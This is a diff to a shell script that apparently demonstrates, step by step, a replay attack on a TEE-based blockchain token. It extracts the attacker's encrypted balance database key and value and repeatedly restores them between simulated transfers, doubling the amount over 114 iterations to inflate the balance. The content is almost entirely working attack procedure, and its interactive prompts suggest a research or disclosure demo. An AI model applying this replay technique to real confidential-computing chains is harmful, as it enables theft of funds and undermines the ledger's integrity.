@@ -74,17 +74,16 @@ touch $BACKUP/adv_value
 touch $BACKUP/kv_store
 
 # get boosting key and value
-teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to get boosting key and value ..."
-teebox log "get boosting key and value"
+teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to get attacker's addr1 balance database key and value ..."
+#teebox log "Get boosting key and value"
 
 teebox log "[bold]Simulate(Transfer(attacker_addr2, attacker_addr1, 1))[/]"
 generate_and_sign_transfer ${attacker2} ${attacker1} 1 snip20_getkey
 simulate_tx snip20_getkey
 show_attacker_balances
 
-res=$(cat $BACKUP/simulate_result)
-echo $res
-teebox log "result of simulate_tx snip20_getkey ${res}"
+#res=$(cat $BACKUP/simulate_result)
+#teebox log "result of simulate_tx snip20_getkey ${res}"
 tag=$(sed '5q;d' $BACKUP/kv_store)
 key=${tag:6:-1}
 tag=$(sed '6q;d' $BACKUP/kv_store)
@@ -92,11 +91,10 @@ value=${tag:8:-1}
 teebox log "attacker addr1 balance encrypted db key=${key}"
 teebox log "attacker addr1 balance encrypted db value=${value}"
 
-teebox log "boost balance of attacker2"
-# boost balance of attacker2
+#teebox log "boost balance of attacker2"
+# FIXME boost balance of attacker2 --> attacker 1 -- it's attacker's addr1 db key/value
 echo $key > $BACKUP/backup_adv_key
 echo $value > $BACKUP/backup_adv_value
-show_attacker_balances
 
 teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to set snapshot ${snapshot_uniq_label}-boost ..."
 teebox log "Fork()    [light_goldenrod1]# set snapshot of database[/] ${snapshot_uniq_label}-boost"
@@ -109,20 +107,20 @@ teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to start Balanc
 for i in {1..114}; do
     echo
     teebox log "starting iteration=${i} ..."
-    #show_attacker_balances
+    show_attacker_balances
 
     # now balance[addr1]=0
     # replay the balance[addr1] back to B
     #teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to restore ..."
-    #teebox log "Replay(balance\[attacker1]=B)    [light_goldenrod1]# reset attacker's account "
+    teebox log "Replay(balance\[addr1]=B)    [light_goldenrod1]# reset attacker's account "
     cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
     cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
 
-    #teebox log "After restoring adv kv"
-    #show_attacker_balances
+    #teebox log "After restoring attacker's balance[addr1]"
+    show_attacker_balances
 
     #teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to simulate tx ..."
-    #teebox log "[bold]Simulate(Transfer(attacker2, attacker1, amount=${amount}))[/]"
+    teebox log "[bold]Simulate(Transfer(addr2, addr1, amount=${amount}))[/]"
     generate_and_sign_transfer ${attacker2} ${attacker1} $amount snip20_boost_1
     simulate_tx snip20_boost_1
     #teebox log "After Simulate()"
@@ -138,26 +136,26 @@ for i in {1..114}; do
     touch $BACKUP/kv_store
 
     #teebox log "After Replay()"
-    #show_attacker_balances
+    show_attacker_balances
 
     #teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to simulate tx ..."
 
     # amt := B if 2B ≤ (2^128 − 1) else (2^128 − 1) − B
     amount=$(bc <<< "${amount} * 2")
 
-    #teebox log "[bold]Simulate(Transfer(attacker1, attacker2, amount=${amount}))[/]"
+    teebox log "[bold]Simulate(Transfer(addr1, addr2, amount=${amount}))[/]"
     generate_and_sign_transfer ${attacker1} ${attacker2} ${amount} snip20_boost_2
     simulate_tx snip20_boost_2
 
     #teebox log "After Simulate()"
-    #show_attacker_balances
+    show_attacker_balances
 
     # attacker addr1 (sender above) encrypted amount sent
     tag=$(sed '4q;d' $BACKUP/kv_store)
     value=${tag:8:-1} 
     echo $value > $BACKUP/backup_adv_value
 
-    #teebox log "ending iteration=${i}"
+    teebox log "ending iteration=${i}"
     #show_attacker_balances
 done
 
